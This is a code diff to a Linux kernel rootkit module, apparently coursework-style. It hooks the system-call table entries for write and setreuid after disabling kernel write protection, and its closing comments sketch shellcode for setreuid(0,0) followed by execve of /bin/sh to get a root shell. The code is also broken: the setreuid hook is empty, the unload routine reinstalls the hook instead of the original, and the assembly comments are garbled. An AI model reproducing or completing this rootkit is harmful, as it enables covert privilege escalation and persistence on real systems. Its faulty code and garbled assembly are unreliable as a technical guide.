@@ -47,6 +47,10 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
     kfree(kbuff);
     return r;
 }
+//This is the basic method that we will overwrite the default setreuid with 
+asmlinkage int mod_setreuid(uid_t ruid, uid_t euid){
+
+}
 
 int rkit_init(void) {
     //list_del_init(&__this_module.list);
@@ -61,8 +65,10 @@ int rkit_init(void) {
     }
 
     write_cr0(read_cr0() & (~ 0x10000));
-    //this is writiing to __NR_write, we might want to overwrite setreuid?
     o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
+    //this overrides the current setreuid in the table with our modded version
+    //possibly__NR_setreuid64 instead of __NR_setreuid32?
+    o_mod = (void *) xchg(&sys_call_table[__NR_setreuid32], (psize)mod_setreuid);
     write_cr0(read_cr0() | 0x10000);
 
     return 0;
@@ -71,6 +77,30 @@ int rkit_init(void) {
 void rkit_exit(void) {
     write_cr0(read_cr0() & (~ 0x10000));
     xchg(&sys_call_table[__NR_write], (psize)o_write);
+    //this resets our setreuid to 
+    xchg(&sys_call_table[__NR_setreuid32], (psize)mod_setreuid);
     write_cr0(read_cr0() | 0x10000);
     printk("rkit: Module unloaded\n");
 }
+
+//Answer in assembly?
+
+/*
+xor eaxmeax 
+mov eax,70 -> move 70 into eax number of reuid function
+move elox,0 -> rid 
+move eax,0  -> eid 
+int 0x80 -> call kernel 
+*/
+
+/*
+jobpath= "\bin\shNAAAABBBB"
+xor eax,eax 
+mov elox,jobpath 
+mov [ebu+7],al  <- Find 7th char [N] and replace with a 0 
+mov [ebx+8],ebx <- moves AAAA to ebx 
+mov [ebx+12],eax 
+mov eax,11
+lea eex, ebx+8 
+lea edu ebx+12 <- /bin/sh 
+int 0x80 
